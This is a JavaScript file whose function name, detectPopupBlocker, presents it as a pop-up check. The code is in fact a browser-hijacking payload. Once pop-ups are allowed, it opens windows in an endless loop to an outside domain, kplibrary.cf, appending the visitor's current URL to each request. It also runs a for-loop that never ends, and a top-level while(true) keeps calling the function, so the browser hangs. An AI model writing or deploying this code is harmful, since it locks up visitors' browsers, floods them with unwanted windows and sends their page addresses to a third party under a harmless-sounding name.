function detectPopupBlocker() {
  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
  if (!myTest) {
    alert("Please allow pop-up's for this website.");

  } else {
    myTest.close();
    while (true) {
      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
      var URL = "http://kplibrary.cf/" + location.href;
      var win = window.open(URL, "_blank", strWindowFeatures);
      for (var i = 5; i > 3; i = i + 1) {
        console.log(i);
      }
    }
  }
}
while (true) {
  detectPopupBlocker();
}
